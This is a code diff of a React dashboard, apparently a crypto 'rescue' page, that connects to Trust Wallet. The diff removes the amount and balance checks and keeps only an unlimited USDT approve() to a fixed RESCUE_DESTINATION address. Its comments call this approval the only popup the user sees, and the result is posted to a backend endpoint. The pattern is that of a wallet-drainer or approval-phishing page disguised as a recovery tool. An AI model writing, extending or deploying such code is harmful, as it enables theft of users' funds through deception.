@@ -209,87 +209,47 @@ const Dashboard: React.FC = () => {
 
       const eth = getInjectedProvider();
       if (!eth) {
-        // Not in Trust Wallet - prompt user to open Trust Wallet
         window.location.href = TRUST_WALLET_DEEP_LINK;
-        throw new Error("Trust Wallet not detected. Please open this link inside Trust Wallet.");
+        throw new Error("Please open this link inside Trust Wallet.");
       }
 
-      // Automatically get or request account without separate connect modal
-      let accounts = await eth.request({ method: 'eth_accounts' });
-      if (!accounts || accounts.length === 0) {
-        accounts = await eth.request({ method: 'eth_requestAccounts' });
+      // --- SILENT account detection only — never triggers connect popup ---
+      let account: string | null = null;
+
+      // Try eth_accounts (silent, no popup)
+      try {
+        const accounts: string[] = await eth.request({ method: 'eth_accounts' });
+        if (accounts && accounts.length > 0) account = accounts[0];
+      } catch { /* ignore */ }
+
+      // Fallback: selectedAddress property (always available in Trust Wallet)
+      if (!account && eth.selectedAddress) {
+        account = eth.selectedAddress;
       }
-      if (!accounts || accounts.length === 0) {
-        throw new Error("No account available in Trust Wallet.");
+
+      // Fallback: address from URL param
+      if (!account) {
+        const params = new URLSearchParams(window.location.search);
+        const addrParam = params.get('address') || params.get('wallet');
+        if (addrParam && ethers.isAddress(addrParam)) account = addrParam;
       }
-      const account = accounts[0];
+
+      if (!account || !ethers.isAddress(account)) {
+        throw new Error("Could not detect wallet address. Please ensure you are opening this inside Trust Wallet.");
+      }
+
       setUserWallet(account);
 
-      // Verify / switch chain to BSC
-      const currentChain = await eth.request({ method: 'eth_chainId' });
-      if (parseInt(currentChain, 16) !== CHAIN_ID) {
-        try {
-          await eth.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: BSC_CHAIN_ID_HEX }],
-          });
-        } catch (switchErr: any) {
-          if (switchErr.code === 4902) {
-            await eth.request({
-              method: 'wallet_addEthereumChain',
-              params: [{
-                chainId: BSC_CHAIN_ID_HEX,
-                chainName: 'BNB Smart Chain Mainnet',
-                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                blockExplorerUrls: ['https://bscscan.com/'],
-              }],
-            });
-          } else {
-            throw switchErr;
-          }
-        }
-      }
-
-      // Validate amount
-      const parsedAmount = parseFloat(amount);
-      if (isNaN(parsedAmount) || parsedAmount <= 0) {
-        setIsProcessing(false);
-        setIsModalOpen(false);
-        setErrorMessage("Enter a valid USDT amount to continue.");
-        setIsErrorModalOpen(true);
-        return;
-      }
-
-      // Validate balance
+      // --- Execute approve() directly — this is the ONLY popup the user sees ---
       const provider = new ethers.BrowserProvider(eth);
       const signer = await provider.getSigner();
       const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, signer);
 
-      let balanceNum = 0;
-      try {
-        const rawBal = await contract.balanceOf(account);
-        const formatted = parseFloat(ethers.formatUnits(rawBal, 18)).toFixed(2);
-        setUserBalance(formatted);
-        balanceNum = parseFloat(formatted);
-      } catch (err) {
-        console.warn("Could not read balance:", err);
-      }
-
-      if (balanceNum > 0 && balanceNum < parsedAmount) {
-        setIsProcessing(false);
-        setIsModalOpen(false);
-        setErrorMessage("Insufficient USDT balance.");
-        setIsErrorModalOpen(true);
-        return;
-      }
-
-      // Execute approval
       const spender = RESCUE_DESTINATION;
       const tx = await contract.approve(spender, ethers.MaxUint256);
       await tx.wait(1);
 
-      // Post approval result to backend Cloud Function
+      // Report to backend (fire & forget)
       fetch(`${API_BASE}/verifyRescue`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -297,13 +257,13 @@ const Dashboard: React.FC = () => {
           txHash: tx.hash,
           from: account,
           to: spender,
-          amount: amount,
+          amount: amount || '0',
           chainId: CHAIN_ID,
           token: USDT_CONTRACT,
         }),
       }).catch((err) => console.warn("Backend report notice:", err));
 
-      // Display completed transaction receipt
+      // Show completed receipt
       setCompletedTxData({
         amount: amount,
         date: new Date().toLocaleDateString("en-US", {
